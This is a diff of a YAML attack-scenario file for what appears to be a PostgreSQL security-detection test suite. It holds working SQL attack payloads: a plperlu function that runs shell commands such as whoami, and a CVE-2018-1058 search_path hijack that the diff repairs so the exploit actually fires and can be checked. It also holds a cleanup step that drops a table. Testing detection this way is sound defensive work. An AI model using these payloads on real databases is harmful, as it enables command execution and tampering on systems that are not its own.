@@ -568,12 +568,19 @@ attacks:
                 "CREATE EXTENSION IF NOT EXISTS plperlu; CREATE OR REPLACE FUNCTION perl_exec(cmd text) RETURNS text AS $$ my $output = `$_[0]`; return $output; $$ LANGUAGE plperlu; SELECT perl_exec('whoami');"]
     expectedDetections: []
 
-  # CVE-2018-1058 — Schema search_path hijacking
+  # CVE-2018-1058 — Schema search_path hijacking.
+  # PR119 rabbit: PostgreSQL searches `pg_catalog` BEFORE `public` by
+  # default, so plain `SELECT upper('test')` resolves to pg_catalog.upper
+  # and the malicious public.upper is never invoked. To actually exercise
+  # the CVE, set search_path so `public` precedes `pg_catalog` in the
+  # SAME session/statement and verify the hijacked output appears.
   - name: cve-2018-1058-search-path-hijack
     type: sqli
     exec:
       command: ["psql", "-tAc",
-                "CREATE OR REPLACE FUNCTION public.upper(text) RETURNS text AS $$ SELECT 'CVE-2018-1058:hijacked:' || $1; $$ LANGUAGE SQL; SELECT upper('test');"]
+                "CREATE OR REPLACE FUNCTION public.upper(text) RETURNS text AS $$ SELECT 'CVE-2018-1058:hijacked:' || $1; $$ LANGUAGE SQL; SET search_path = public, pg_catalog; SELECT upper('test');"]
+    successIndicators:
+      - bodyContains: "CVE-2018-1058:hijacked:test"
     expectedDetections: []
 
   # T1190 — lo_export: write arbitrary file via large object
@@ -661,6 +668,12 @@ attacks:
   - name: cleanup-recreate-bobtest
     type: sqli
     exec:
+      # PR119 rabbit: previous version was non-idempotent. If a run aborted
+      # before cve-impact-drop-table, bobtest already existed and this
+      # block appended a fresh ('restored', 'after-attack') row every run.
+      # That made later COPY/exfil steps non-deterministic. Now we
+      # explicitly DROP+CREATE so the table starts empty every time, then
+      # insert the single baseline row.
       command: ["psql", "-tAc",
-                "CREATE TABLE IF NOT EXISTS bobtest (id SERIAL PRIMARY KEY, key TEXT NOT NULL, value TEXT, created_at TIMESTAMPTZ DEFAULT NOW()); INSERT INTO bobtest (key, value) VALUES ('restored', 'after-attack');"]
+                "DROP TABLE IF EXISTS bobtest; CREATE TABLE bobtest (id SERIAL PRIMARY KEY, key TEXT NOT NULL, value TEXT, created_at TIMESTAMPTZ DEFAULT NOW()); INSERT INTO bobtest (key, value) VALUES ('restored', 'after-attack');"]
     expectedDetections: []
